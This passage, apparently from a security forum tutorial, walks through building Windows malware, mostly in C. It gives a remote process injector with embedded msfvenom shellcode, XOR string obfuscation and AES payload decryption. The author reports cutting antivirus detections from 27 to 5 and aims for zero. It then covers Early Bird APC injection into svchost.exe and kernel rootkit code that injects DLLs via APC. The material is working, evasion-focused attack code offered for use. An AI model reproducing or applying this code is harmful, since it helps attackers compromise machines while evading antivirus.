  IN HANDLE               ProcessHandle,  
  IN OUT PVOID            *BaseAddress,  
  IN ULONG                ZeroBits,  
  IN OUT PULONG           RegionSize,  
  IN ULONG                AllocationType,  
  IN ULONG                Protect );
</code></pre>
<p><code>NTSTATUS</code> is the actual return value, while <code>NTSYSAPI</code> marks the function as a library import and <code>NTAPI</code> defines the windows api calling convention.</p>
<p><code>IN</code> means the function requires it as input, while <code>OUT</code> means that the parameter passed in is modified with some return output.</p>
<p>When we prototype the functions, we just need to note the <code>NTAPI</code> part.<br>
In fact you can also use <code>WINAPI</code> since the both of them resolve to <code>__stdcall</code>.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
</code></pre>
<p>Here we prototype some function pointers that we’ll map the address of the actual functions in <code>ntdll.dll</code> to later.</p>
<p>You might notice that some types are also missing, for example the <code>POBJECT_ATTRIBUTES</code>, so let’s find and define them from the references.</p>
<pre><code class="lang-c">typedef struct _UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength;  
    PWSTR  Buffer;  
} UNICODE_STRING, *PUNICODE_STRING;  
  
typedef struct _OBJECT_ATTRIBUTES {  
    ULONG           Length;  
    HANDLE          RootDirectory;  
    PUNICODE_STRING ObjectName;  
    ULONG           Attributes;  
    PVOID           SecurityDescriptor;  
    PVOID           SecurityQualityOfService;  
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;  
  
typedef struct _PS_ATTRIBUTE {  
    ULONG Attribute;  
    SIZE_T Size;  
    union {  
        ULONG Value;  
        PVOID ValuePtr;  
    } u1;  
    PSIZE_T ReturnLength;  
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;  
  
typedef struct _PS_ATTRIBUTE_LIST  
{  
    SIZE_T       TotalLength;  
    PS_ATTRIBUTE Attributes[1];  
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
</code></pre>
<p>Now Let’s load <code>ntdll.dll</code> and map the functions.</p>
<pre><code class="lang-c">HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
if (!hNtdll)  
{  
    printf("Load ntdll fail\n");  
    exit(1);  
}  
  
NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");
</code></pre>
<p>Finally we can call these functions.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);  
  
int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
     
	int newPid = atoi(argv[1]);  
	printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    HANDLE tHandle;  
    HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
    if (!hNtdll)  
    {  
        printf("Load ntdll fail\n");  
        exit(1);  
    }  
  
    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");  
    void * allocAddr = NULL;  
    SIZE_T allocSize = sizeof(shellcode);  
    NTSTATUS status;  
    status = NtAllocateVirtualMemory(pHandle, &amp;allocAddr, 0, (PULONG)&amp;allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    printf("status alloc: %X\n", status);  
    printf("alloc addr: %p\n", allocAddr);  
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sizeof(shellcode), NULL);  
    printf("status write: %X\n", status);  
    status = NtCreateThreadEx(&amp;tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);  
    printf("status exec: %X\n", status);  
  
	return 0;  
}
</code></pre>
<p>So, if you decide to upload this to antivirus engines (which I don’t recommend, but the choice is yours), what can you expect? Well, you might see 27 out of 72 detections triggering alarms left and right, screaming ‘MALICIOUS!’ It’s as if the antivirus engines are having a celebration. But here’s the real challenge: we’re striving for a complete absence of detections. We’re not looking for a party, we’re after more stealthy.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png" data-download-href="/uploads/short-url/wGhxEciBeqiwVyYKqZTzj2xU4lO.png?dl=1" title="AAA" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png" alt="AAA" data-base62-sha1="wGhxEciBeqiwVyYKqZTzj2xU4lO" width="690" height="189" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 2x" data-dominant-color="F9F7F7"></a></div><p></p>
<p>Like I said msf shellcode is a give away but let’s Try something else.  Time to dust off some classic techniques that never go out of style. We’re diving into XOR encryption, a method you’re probably familiar with when it comes to encrypting shellcode. When XOR encryption is put to work on shellcode, a key is carefully selected to XOR every byte of the shellcode. To decrypt the shellcode, you simply employ the same key to XOR each byte once more, effectively reversing the encryption process and restoring the original shellcode. However, it’s worth noting that XOR encryption can be a walk in the park for attackers who know the key. If you’re up for a challenge, check out the one I posted a while back <a href="https://0x00sec.org/t/reverseme-cipher/35518">ReverseMeCipher</a> which involves XOR encryption. Here’s a writeup to give you some insights <a href="https://0xf00i.github.io/2023/06/12/ReverseMe-Writeup.html" rel="noopener nofollow ugc">CipherWriteup</a> As a general rule, it’s often smarter to combine XOR encryption with other methods.</p>
<p>So first we wanna remove strings and debug symbols,  Running the command <code>strings</code> on our exe reveals strings such as “NtCreateThreadEx”, which may lead to AV detection.</p>
<p>We can remove these strings by again XOR encrypting them and decrypting during runtime, First we start by the function responsible for encryption and decryption</p>
<pre><code class="lang-c">unsigned char * rox(unsigned char *, int, int);
unsigned char * rox(unsigned char * data, int dataLen, int xor_key)
{
    unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen + 1);

    for (int i = 0; i &lt; dataLen; i++)
        output[i] = data[i] ^ xor_key;

    return output;
}
</code></pre>
<p>This Function can be used for encryption and also be used for decryption by applying the same XOR operation. If you XOR the encrypted data with the same <code>xor_key</code>, it will revert to the original data, just formats encrypted shellcode nicely so we can copy and paste, and we only need the encrypt function in our actual injector.</p>
<pre><code class="lang-c">const char* ntdll_str = (const char*)ntdll;
const char* navm_str = (const char*)navm;
const char* nwvm_str = (const char*)nwvm;
const char* ncte_str = (const char*)ncte;
</code></pre>
<p>So like we said NtCreateThreadEx." These strings can be indicative of the program’s functionality and may lead to antivirus (AV), One way to obfuscate these strings and make them less detectable is to XOR encrypt them, and then decrypt them during runtime when they are needed.</p>
<p>For example:</p>
<pre><code class="lang-c">unsigned char ntdll_data[] = {0x3d, 0x27, 0x37, 0x3f, 0x3f, 0x7d, 0x37, 0x3f, 0x3f, 0x53};
unsigned char *ntdll = rox(ntdll_data, 10, 0x53);
</code></pre>
<p>Let’s use <a href="https://www.virustotal.com/" rel="noopener nofollow ugc">Virustotal</a> again and check the detection rate.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png" data-download-href="/uploads/short-url/txuKpdmUR8SvwXRgZT5T5uYfxj3.png?dl=1" title="BBB" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png" alt="BBB" data-base62-sha1="txuKpdmUR8SvwXRgZT5T5uYfxj3" width="690" height="179" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 2x" data-dominant-color="F9F7F8"></a></div><p></p>
<p>Well, going from 27 detections down to 9 is indeed a notable improvement, but it’s essential to recognize that this level of evasion is still relatively basic, especially when relying on tools like <code>msfvenom</code> to achieve our goals.</p>
<p>Alright time for a new code Injection Technique “Early Bird” This Was used by group goes by APT33 How this works Simply it takes advantage of the application threading process that happens when a program executes on a computer. In other words, attackers inject malware code into legitimate process threads in an effort to hide malicious code inside commonly seen and legitimate processes.</p>
<p>We gone use functions like <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>QueueUserAPC</code>, <code>CreateProcessW</code>, and <code>ResumeThread</code> By this time Before injecting the shellcode we  a employs an AES decryption routine, The decryption process uses the Cryptography API (CryptAcquireContextW) functions to decrypt the payload using a predefined key.</p>
<pre><code class="lang-c">int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {

HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;

BOOL CryptAcquire = CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (CryptAcquire == false) {
//printf("CryptAcquireContextW Failed: %d\n", GetLastError());
return -1;
}

BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash);
if (CryptCreate == false) {
//printf("CryptCreateHash Failed: %d\n", GetLastError());
return -1;
}

  
BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
if (CryptHash == false) {
//printf("CryptHashData Failed: %d\n", GetLastError());
return -1;
}

  

BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &amp;hKey);
if (CryptDerive == false) {
//printf("CryptDeriveKey Failed: %d\n", GetLastError());
return -1;
}

  

BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &amp;payload_len);
if (Crypt_Decrypt == false) {
//printf("CryptDecrypt Failed: %d\n", GetLastError());
return -1;
}

  

CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);

return 0;
}
</code></pre>
<p>The AES decryption routine ensures that the injected shellcode is in its original, unencrypted form, which is essential for executing it within the target process. This decryption process allows attackers to conceal the true nature of their payload until it is actively executed in the target process’s thread.</p>
<p>Next <code>CreateProcessW</code></p>
<pre><code class="lang-c">pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
if (pCreateProcessW == NULL) {
    // Handle error if the function cannot be found
}

STARTUPINFOW si;
PROCESS_INFORMATION pi;

// Clear out startup and process info structures
RtlSecureZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si;
RtlSecureZeroMemory(&amp;pi, sizeof(pi));

std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

HANDLE pHandle = NULL;
HANDLE hThread = NULL;
DWORD Pid = 0;

BOOL cProcess = pCreateProcessW(NULL, &amp;pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);

</code></pre>
<p>The <code>CreateProcessW</code> function is invoked to create a new process, which, in this case, is intended to execute the <code>svchost.exe</code> application. However, a critical parameter here is <code>CREATE_SUSPENDED</code>, which is set to <code>TRUE</code>, After successfully creating the suspended process, the code retrieves the process and thread handles. These handles are crucial for further manipulation of the newly created process.</p>
<pre><code class="lang-auto">pHandle = pi.hProcess;
hThread = pi.hThread;
Pid = pi.dwProcessId;
</code></pre>
<p>With the suspended process and its associated handles in place, now we ready to proceed with the code injection, which involves injecting shellcode into the memory space of the newly created process.</p>
<p>Creating a suspended process provides an ideal opportunity to inject code and manipulate the process without raising immediate suspicion.</p>
<p>In the next steps, we will proceed to inject the shellcode into the suspended process, ultimately leading to its execution within the context of the target process’s thread, However Before injecting the shellcode, memory space is allocated within the target process to accommodate the injected code. This allocation is done using the <code>VirtualAllocEx</code> function.</p>
<pre><code class="lang-c">LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
</code></pre>
<p>The shellcode, which was previously decrypted, is now written into the allocated memory space within the target process using the <code>WriteProcessMemory</code> function.</p>
<pre><code class="lang-cpp">DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &amp;bytesWritten);
</code></pre>
<p>With the shellcode successfully injected into the target process’s memory, the code prepares for its execution. This is done using the <code>QueueUserAPC</code> function, which enqueues the shellcode for execution within the context of a specific thread within the target process.</p>
<pre><code class="lang-c">if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
    pResumeThread(hThread);
}
</code></pre>
<p>Now, let’s verify the success of our concealment strategy by injecting the shellcode into a suspended process and manipulating the memory space within the context of the process’s thread.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png" data-download-href="/uploads/short-url/fCUP6PNVSZF5U2KAGq0ym7rxtmV.png?dl=1" title="CCC" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png" alt="CCC" data-base62-sha1="fCUP6PNVSZF5U2KAGq0ym7rxtmV" width="690" height="169" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 2x" data-dominant-color="F8F7F7"></a></div><p></p>
<p>Among the initial 72 detections, we’ve successfully narrowed it down to a mere 5. We commenced with 27 detections, which subsequently decreased to 9, and now we find ourselves with just 5 remaining, and we can keep it going and I’m pretty sure we hit that big zero, This overarching perspective emphasizes the importance of having a diverse array of techniques in your arsenal.</p>
<h1><a name="writing-a-simple-rootkit-22" class="anchor" href="https://0x00sec.org#writing-a-simple-rootkit-22"></a>Writing a simple Rootkit</h1>
<p>Kernel mode rootkits operate at the most privileged level, known as “Ring 0,” in the computer’s architecture. In contrast, user mode rootkits run at “Ring 3,” which is a lower privilege level.</p>
<p>In order to grasp the workings of kernel mode rootkits, it is essential to have a solid grasp of the basics of Windows device drivers. Essentially, a device driver is a software component responsible for interfacing with hardware and managing Input/Output Request Packets (IRPs).</p>
<h3><a name="writing-a-windows-device-driver-23" class="anchor" href="https://0x00sec.org#writing-a-windows-device-driver-23"></a>Writing a Windows Device Driver</h3>
<p>Let’s start by building a basic Windows device driver:</p>
<pre><code class="lang-c">#include "ntddk.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    DbgPrint("Hello World!");
    return STATUS_SUCCESS;
}

</code></pre>
<p>This simple driver initializes and prints “Hello World!” to the kernel debugger. However, to perform more complex tasks, we need to understand IRPs.</p>
<h2><a name="understanding-io-request-packets-irps-24" class="anchor" href="https://0x00sec.org#understanding-io-request-packets-irps-24"></a>Understanding I/O Request Packets (IRPs)</h2>
<p>IRPs are data structures used to communicate between user-mode programs and kernel-mode drivers. When a user-mode program, for example, writes data to a file handle, the kernel creates an IRP to manage this operation.</p>
<p>To process IRPs effectively, a driver must define functions for handling them. In the provided code, we set up a basic dispatch function that completes the IRP with a success status. In reality, different functions would handle various IRP types.</p>
<pre><code class="lang-c">NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
</code></pre>
<p>The driver sets up major function pointers, such as <code>IRP_MJ_CREATE</code>, <code>IRP_MJ_CLOSE</code>, <code>IRP_MJ_READ</code>, <code>IRP_MJ_WRITE</code>, and <code>IRP_MJ_DEVICE_CONTROL</code>, to handle specific IRP types. In a comprehensive driver, separate functions would handle these major functions.</p>
<h2><a name="creating-a-file-handle-25" class="anchor" href="https://0x00sec.org#creating-a-file-handle-25"></a>Creating a File Handle</h2>
<p>File handles are essential for user-mode programs to interact with kernel drivers. In Windows, to use a kernel driver from user-mode, the user-mode program must open a file handle to the driver. The driver first registers a named device, and then the user-mode program opens it as if it were a file.</p>
<pre><code class="lang-c">const WCHAR deviceNameBuffer[] = L"\\Device\\MyDevice";
PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceNameUnicodeString;

    RtlInitUnicodeString(&amp;deviceNameUnicodeString, deviceNameBuffer);

    ntStatus = IoCreateDevice(DriverObject, 0, &amp;deviceNameUnicodeString, 0x00001234, 0, TRUE, &amp;g_RootkitDevice);
    // ...
}

</code></pre>
<p>This code registers a device named “MyDevice.” A user-mode program can open this device using a fully qualified path, e.g., <code>\\\\Device\\MyDevice</code>. This file handle can be used with functions like <code>ReadFile</code> and <code>WriteFile</code>, which generate IRPs for communication.</p>
<p>Understanding the interaction between user-mode and kernel-mode via IRPs and file handles is fundamental to writing effective Windows device drivers, an essential concept in the realm of kernel mode rootkits.</p>
<p>Remember <strong>DLL Injection</strong>? Now, let’s take a look at how it’s employed by rootkits to inject malicious code or custom device drivers directly into the Windows kernel. In the context of the previously discussed device driver and rootkit concepts, we can explore how kernel-mode DLL injection fits into the picture:</p>
<h3><a name="kernel-mode-dll-26" class="anchor" href="https://0x00sec.org#kernel-mode-dll-26"></a>Kernel-Mode DLL</h3>
<p>The process typically begins with the <code>DriverEntry</code> function, which is the entry point for our driver. Here’s how we start:</p>
<pre><code class="lang-c">NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
{

NTSTATUS st;
  
PsSetLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);

pDriverobject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;
  
return STATUS_SUCCESS;
}
</code></pre>
<p>In this code snippet, we employ the <code>PsSetLoadImageNotifyRoutine</code> function to register an image load notification routine. This step is crucial as it allows us to monitor the loading of specific system DLLs, such as <code>kernel32.dll</code>, into the kernel’s address space.</p>
<p>Additionally, we set the driver’s unload function (<code>pDriverobject-&gt;DriverUnload</code>) to handle cleanup operations when the driver is unloaded. This ensures that any resources or callbacks registered during the driver’s lifetime are properly managed.</p>
<h3><a name="image-load-notification-27" class="anchor" href="https://0x00sec.org#image-load-notification-27"></a>Image Load Notification</h3>
<p>Our monitoring process hinges on image load notifications. We need to identify when the system loads <code>kernel32.dll</code>, a fundamental DLL for Windows operating systems. The <code>LoadImageNotifyRoutine</code> function enables this monitoring.</p>
<pre><code class="lang-c">VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
{
    if (ImageName != NULL)
    {
        // Check if the loaded image matches the name of kernel32.dll
        WCHAR kernel32Mask[] = L"*\\KERNEL32.DLL";
        UNICODE_STRING kernel32us;
        RtlInitUnicodeString(&amp;kernel32us, kernel32Mask);

        if (FsRtlIsNameInExpression(&amp;kernel32us, ImageName, TRUE, NULL))
        {
            PKAPC Apc;
            
            if (Hash.Kernel32dll == 0)
            {
                // Initialize the Hash structure and import the function addresses
                Hash.Kernel32dll = (PVOID)pImageInfo-&gt;ImageBase;
                Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
            }

            // Create an Asynchronous Procedure Call (APC) to initiate DLL injection
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                KeInitializeApc(Apc, KeGetCurrentThread(), 0, (PKKERNEL_ROUTINE)APCInjectorRoutine, 0, 0, KernelMode, 0);
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
            }
        }
    }
    return;
}

</code></pre>
<p>The <code>LoadImageNotifyRoutine</code> function plays a pivotal role in our DLL injection process. It checks if the <code>ImageName</code> parameter is not NULL, ensuring that we are actively monitoring loaded images with names. Furthermore, we examine if the loaded image matches the name of <code>kernel32.dll</code>.</p>
<p>If a match is found, we proceed with initializing the <code>Hash</code> structure and creating an Asynchronous Procedure Call (APC) using the <code>APCInjectorRoutine</code>. The APC serves as a mechanism to trigger the DLL injection process into a target process.</p>
<p>These code snippets are instrumental in monitoring and responding to the loading of <code>kernel32.dll</code> and lay the groundwork for our upcoming discussion on kernel-mode DLL injection.</p>
<h3><a name="unloading-the-driver-28" class="anchor" href="https://0x00sec.org#unloading-the-driver-28"></a>Unloading the Driver</h3>
<p>Before we dive deeper into DLL injection, it’s essential to understand how the driver can be unloaded properly. We accomplish this using the <code>Unload</code> function.</p>
<pre><code class="lang-c">VOID Unload(IN PDRIVER_OBJECT pDriverobject)
{
    // Remove the image load notification routine
    PsRemoveLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);
}
</code></pre>
<p>Here, we use the <code>PsRemoveLoadImageNotifyRoutine</code> function to unregister the previously registered image load notification routine. This step ensures that we can gracefully clean up and stop monitoring loaded images when the driver is unloaded.</p>
<h3><a name="dll-injection-29" class="anchor" href="https://0x00sec.org#dll-injection-29"></a>DLL Injection</h3>
<p>Our exploration of kernel-mode DLL injection is incomplete without understanding how the actual injection takes place. The <code>DllInject</code> function is the key to achieving this.</p>
<pre><code class="lang-c">NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cidprocess = { 0 };
    CHAR DllFormatPath[] = "C:\\foo.dll";
    ULONG Size = strlen(DllFormatPath) + 1;
    PVOID pvMemory = NULL;

    cidprocess.UniqueProcess = ProcessId;
    cidprocess.UniqueThread = 0;

    // Open the target process
    if (NT_SUCCESS(ZwOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;oa, &amp;cidprocess)))
    {
        // Allocate virtual memory in the target process
        if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &amp;pvMemory, 0, &amp;Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        {
            // Create an APC (Asynchronous Procedure Call) to load the DLL
            KAPC_STATE KasState;
            PKAPC Apc;

            // Attach to the target process
            KeStackAttachProcess(Peprocess, &amp;KasState);

            // Copy the DLL path to the target process's memory
            strcpy(pvMemory, DllFormatPath);

            // Detach from the target process
            KeUnstackDetachProcess(&amp;KasState);

            // Allocate memory for the APC
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                // Initialize the APC with the appropriate routine and parameters
                KeInitializeApc(Apc, Pethread, 0, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);

                // Insert the APC into the thread's queue
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
                return STATUS_SUCCESS;
            }
        }
        // Close the target process handle
        ZwClose(hProcess);
    }

    return STATUS_NO_MEMORY;
}

</code></pre>
<p>The <code>DllInject</code> function serves the critical role of injecting a DLL into a target process in kernel mode. It accepts several parameters, including the <code>ProcessId</code> of the target process, the <code>PEPROCESS</code> structure of the target process (<code>Peprocess</code>), the <code>PETHREAD</code> structure of the target process (<code>Pethread</code>), and a Boolean value indicating whether alertable I/O is allowed (<code>Alert</code>).</p>
<p>The injection process begins with the opening of the target process using <code>ZwOpenProcess</code>. This step grants us access to the target process with full privileges.</p>
<p>Subsequently, we allocate virtual memory within the target process using <code>ZwAllocateVirtualMemory</code>. This allocated memory will be used to store the path to the DLL that we intend to inject.</p>
<p>To safely write data into the target process’s memory, we attach to the target process using <code>KeStackAttachProcess</code>. This attachment is crucial for the integrity and safety of the DLL injection process.</p>
<p>With the attachment in place, we copy the path of the DLL to be injected into the allocated virtual memory within the target process. This path is defined in the <code>DllFormatPath</code> variable.</p>
<p>After successfully copying the DLL path, we detach from the target process using <code>KeUnstackDetachProcess</code>.</p>
<p>The heart of the DLL injection lies in the creation of an Asynchronous Procedure Call (APC). This is accomplished by allocating memory for the APC using <code>ExAllocatePool</code>. The APC is initialized with the necessary routine and parameters.</p>
<ul>
<li>The <code>Apc</code> structure is initialized using <code>KeInitializeApc</code>.</li>
<li>The parameters include the target thread (<code>Pethread</code>) and an APC routine (<code>APCKernelRoutine</code>) responsible for loading the DLL.</li>
<li>Additionally, the normal routine is specified as <code>Hash.pvLoadLibraryExA</code> to load the DLL using <code>LoadLibraryExA</code> from <code>kernel32.dll</code>.</li>
<li>The APC is inserted into the thread’s queue with <code>KeInsertQueueApc</code>.</li>
</ul>
<p>To ensure that DLL injection occurs in a controlled and synchronized manner, we rely on the <code>SirifefWorkerRoutine</code> and <code>APCInjectorRoutine</code> functions.</p>
<pre><code class="lang-c">VOID SirifefWorkerRoutine(PVOID Context)
{
    DllInject(((PSIRIFEF_INJECTION_DATA)Context)-&gt;ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Process, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Ethread, FALSE);
    KeSetEvent(&amp;((PSIRIFEF_INJECTION_DATA)Context)-&gt;Event, (KPRIORITY)0, FALSE);
    return;
}
</code></pre>
<p>The <code>SirifefWorkerRoutine</code> function acts as a worker routine responsible for triggering the DLL injection. It accepts a single <code>Context</code> parameter.</p>
<p>Within this function, the actual DLL injection is initiated by calling the <code>DllInject</code> function. The parameters provided include the target process’s ID, the process’s <code>EPROCESS</code> structure, and the process’s <code>ETHREAD</code> structure. The final parameter, <code>FALSE</code>, indicates that alertable I/O is not allowed.</p>
<p>Once the DLL injection process completes, an event (<code>KeSetEvent</code>) is set to signal the successful injection. This event allows us to synchronize the completion of the injection process with other parts of the code.</p>
<h3><a name="dll-injection-via-apc-30" class="anchor" href="https://0x00sec.org#dll-injection-via-apc-30"></a>DLL Injection via APC</h3>
